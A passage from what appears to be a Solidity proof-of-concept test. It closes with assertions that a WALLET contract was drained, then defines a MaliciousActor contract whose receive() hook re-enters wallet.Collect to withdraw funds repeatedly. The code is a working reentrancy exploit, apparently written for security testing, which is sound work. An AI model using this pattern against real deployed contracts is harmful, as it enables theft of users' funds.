        // Verify contract was drained
        assertEq(address(wallet).balance, 0, "Wallet should be drained");
        assertEq(address(attacker).balance, DEPOSIT, "Attacker should have stolen funds");
    }
}

contract MaliciousActor {
    WALLET public wallet;
    uint256 depth;
    uint256 attackAmount;
    uint256 private constant MAX_DEPTH = 2;

    constructor(WALLET _wallet) {
        wallet = _wallet;
    }

    function attack(uint256 amount) public {
        depth = 0;
        attackAmount = amount;
        wallet.Collect(attackAmount);
    }

    receive() external payable {
        if (++depth < MAX_DEPTH) {
            wallet.Collect(attackAmount);
        }
    }
}
